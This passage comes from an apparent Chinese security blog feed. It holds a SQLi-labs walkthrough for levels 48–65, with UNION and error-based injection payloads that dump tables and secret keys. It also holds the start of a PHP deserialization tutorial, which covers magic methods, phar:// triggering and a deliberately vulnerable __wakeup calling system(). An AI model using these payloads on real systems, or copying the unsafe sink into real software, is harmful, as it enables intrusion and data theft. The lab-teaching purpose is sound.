相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以，这里国光不再过多演示了。</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话国光这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY $id</code></td></tr></tbody></table><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注、堆叠注入</td><td><code>ORDER BY &#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p><h2 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h2><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>简单源码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> reset:</span><br><span class="line">    <span class="comment"># 根据时间戳生成 cookie</span></span><br><span class="line">    setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> cookie 中有 challenge:</span><br><span class="line">        $sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 生成 cookie</span></span><br><span class="line">        $expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">        $hash = data($table,$col);</span><br><span class="line">        setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line">    <span class="keyword">if</span> $_GET[<span class="string">'id'</span>]:</span><br><span class="line">        计数器 + <span class="number">1</span></span><br><span class="line">        $sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">    <span class="keyword">if</span> 有查询成功:</span><br><span class="line">        输出查询信息</span><br><span class="line">    <span class="keyword">else</span>：</span><br><span class="line">        啥都不输出</span><br><span class="line"></span><br><span class="line"><span class="comment"># key 被双重过滤了</span></span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br></pre></td></tr></table></figure><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p><p><strong>判断闭合方式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;--+</span><br></pre></td></tr></table></figure><p><strong>判断字段数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; order by 3--+</span><br><span class="line">?id=1&apos; order by 4--+</span><br></pre></td></tr></table></figure><p><strong>查询有可注入的字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p>字段数 2,3</p><p>查询表名**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()) --+</span><br></pre></td></tr></table></figure><p>表名为：KMA0E2Z29V ，这个表名可能是随机的 不同用户不一样</p><p><strong>查询列名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x4b4d413045325a323956)--+</span><br></pre></td></tr></table></figure><p>查到列名如下：id、sessid、secret_1XVB、tryy</p><p><strong>查询字段值</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(secret_1XVB)+FROM+KMA0E2Z29V)--+</span><br></pre></td></tr></table></figure><p>拿到 key 值为：UNK985xGrJL5PIWKGogHXo3F</p><p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=($id)</code></td></tr></tbody></table><p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，国光这里不再赘述。</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = ($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure><p>这里国光注入的表名为：WOO6ID239T，列名为：secret_OD68</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-58 的思路一样，只是拼接方式不一样，详见 Less-58</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p>与 Less-58 注入方式一致，只是拼接方式不一样罢了，详见 Less-58</p><h3 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了，这是一个大工程，在实战工程中还是靠 sqlmap 这种自动化注入神器了，手工注入的话岂不是得天荒地老。</p><h3 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h3 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(($id))</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p><h3 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p>与 Less-62 注入方式一致，只是拼接方式不一样罢了，详见 Less-62</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL-注入&quot;&gt;&lt;a href=&quot;#SQL-注入&quot; class=&quot;headerlink&quot; title=&quot;SQL 注入&quot;&gt;&lt;/a&gt;SQL 注入&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;注入攻击是 Web 安全领域中一种最为常见的攻击方式。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XS
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined12/fd61bb58.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined12/fd61bb58.html</id>
    <published>2020-08-12T14:00:00.000Z</published>
    <updated>2020-08-20T09:35:03.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="面向对象、类、对象"><a href="#面向对象、类、对象" class="headerlink" title="面向对象、类、对象"></a>面向对象、类、对象</h2><p>面向对象程序设计（英语：Object-orientedprogramming，缩写：OOP）是种<strong>具有对象概念的程序编程典范</strong>，<strong>同时也是一种程序开发的抽象方针</strong>。</p><p>类（英语：class）在面向对象编程中是<strong>一种面向对象计算机编程语言的构造</strong>，是创建对象的蓝图，<strong>描述了所创建的对象共同的属性和方法</strong>。</p><p>在面向对象（ObjectOriented）的软件中，对象（Object）是某一个类（Class）的实例（Instance）</p><blockquote><p><strong>类实例化 → 对象 ， 对象抽象化 → 类</strong></p></blockquote><h2 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h2><p>序列化给我们传递对象提供了一种简单的方法。把一个对象转换为字节序列，但并不是类型转换，目的是将<strong>该字符串存储在本地</strong>。相反的行为称为反序列化。</p><blockquote><p><strong>序列化和反序列化的目的是使得程序间传输对象会更加方便</strong></p></blockquote><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h2 id="PHP中的相关函数"><a href="#PHP中的相关函数" class="headerlink" title="PHP中的相关函数"></a>PHP中的相关函数</h2><blockquote><p><strong>serialize()将一个对象转换成一个字符串。unserialize()将字符串还原为一个对象</strong></p></blockquote><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a><strong>serialize()</strong></h3><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> chybeta;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建了一个新的对象，并且将其序列化后的结果打印出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>O</code>代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。<code>7</code>表示对象的名称有7个字符。<code>&quot;chybeta&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，<code>4</code>表示该字符串的长度，<code>&quot;test&quot;</code>为字符串的名称，之后的类似。</p><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a><strong>unserialize()</strong></h3><p>与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = <span class="string">'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'</span>; print_r($class2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class2_unser = unserialize($class2);</span><br><span class="line">print_r($class2_ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200806135846.png" alt="20200806135846"></p><blockquote><p>当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。<br>反序列化之前要把类定义好</p></blockquote><h2 id="Magicmethods"><a href="#Magicmethods" class="headerlink" title="Magicmethods"></a>Magicmethods</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magicmethods)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="主要魔术方法"><a href="#主要魔术方法" class="headerlink" title="主要魔术方法"></a>主要魔术方法</h3><h4 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h4><p>构造函数，PHP5允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h4><p>打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。</p><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h4><p>析构函数，PHP5引入了析构函数的概念，这类似于其它面向对象的语言，如C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p>该在一个对象被序列化的时候调用。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>该方法在一个对象被反序列化的时候调用。</p><h3 id="调用点–-phar"><a href="#调用点–-phar" class="headerlink" title="调用点– phar://"></a>调用点– phar://</h3><p>当程序中没有直接的 unserialize 函数调用的时候，我们应该如何做呢？</p><ol><li><p>先查看有没有文件写入点（文件上传等等）。</p></li><li><p>再查找程序中有没有可控的文件操作点：file_get_contents、unlink、file_exists 等等。</p></li><li><p>Phar 的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是该攻击手法最核心的地方。</p></li><li><p>根据原程序中的类以及相应的调用链，生成一个带有反序列化数据的 phar。</p></li><li><p>上传 phar 文件，并使用文件操作点和 phar:// 协议去读取他，触发反序列化。</p></li></ol><h3 id="Magic-methods-实例"><a href="#Magic-methods-实例" class="headerlink" title="Magic methods 实例"></a>Magic methods 实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">magic_test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data1 = <span class="string">"dbapp1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $data2 = <span class="string">"dbapp2"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">print_data</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data1.<span class="keyword">$this</span>-&gt;data2.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep\n"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"data1"</span>, <span class="string">"data2"</span>); <span class="comment">//思考</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"准备创建对象\n"</span>;</span><br><span class="line">$obj = <span class="keyword">new</span> magic_test();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"对象创建完成\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"准备序列化对象\n"</span>;</span><br><span class="line">$serialized = serialize($obj);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"序列化对象完成\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"准备序列化后的对象\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Serialized: "</span>.$serialized.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"序列化对象完成\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"准备反序列化对象\n"</span>;</span><br><span class="line">$obj2 = unserialize($serialized); <span class="comment">//把对象存到obj2里面</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"反序列化完成\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"准备调用方法\n"</span>;</span><br><span class="line">$obj2-&gt;print_data();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"调用方法结束\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"脚本运行结束\n"</span>;</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="http://qiniuyun.lintstar.top/20200806115737.png" alt="20200806115737"></p><h2 id="PHP反序列化漏洞-1"><a href="#PHP反序列化漏洞-1" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p>PHP反序列化漏洞又叫<strong>PHP对象注入漏洞</strong>，反序列化的数据本质上来说是没有危害的，但是在反序列化<strong>参数可控</strong>时，可能会产生严重的安全威胁。当传给unserialize()的参数可控时，我们可以通过传入一个<strong>精心构造的序列化字符串</strong>，从而<strong>控制对象内部的变量甚至是函数</strong>。</p><h3 id="PHP反序列化漏洞实例"><a href="#PHP反序列化漏洞实例" class="headerlink" title="PHP反序列化漏洞实例"></a>PHP反序列化漏洞实例</h3><h4 id="Magicmethods-wakeup-实例1"><a href="#Magicmethods-wakeup-实例1" class="headerlink" title="Magicmethods-__wakeup 实例1"></a>Magicmethods-__wakeup 实例1</h4><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd = <span class="string">'ls'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    